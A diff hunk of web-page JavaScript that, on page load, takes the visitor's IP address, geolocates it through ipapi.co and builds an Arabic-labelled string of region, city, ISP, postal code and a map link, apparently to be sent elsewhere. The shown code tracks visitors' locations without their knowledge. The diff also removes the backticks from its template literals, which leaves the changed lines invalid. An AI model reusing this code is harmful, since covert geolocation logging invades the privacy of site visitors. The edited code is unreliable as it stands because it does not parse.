@@ -193,23 +193,23 @@ window.onload = async function () {
         const ipData = await ipResponse.json();
         console.log("IP:", ipData.ip);
         
-        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json`);
+        const locResponse = await fetch(https://ipapi.co/${ipData.ip}/json);
         const loc = await locResponse.json();
         console.log("Location data from ipapi:", loc);
 
         let googleMapUrl = "تعذر توليد رابط الخريطة";
         if (loc.latitude && loc.longitude) {
-            googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
+            googleMapUrl = https://www.google.com/maps?q=${loc.latitude},${loc.longitude};
         }
 
-        const locationString = `
+        const locationString = 
             المنطقة: ${loc.region || 'غير معروف'}
             المدينة: ${loc.city || 'غير معروف'}
             المحافظة: ${loc.county || 'غير معروف'}
             المزود: ${loc.org || 'غير معروف'}
             الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
             رابط الخريطة: ${googleMapUrl}
-        `;
+        ;
 
         console.log("Location string to send:", locationString);
 
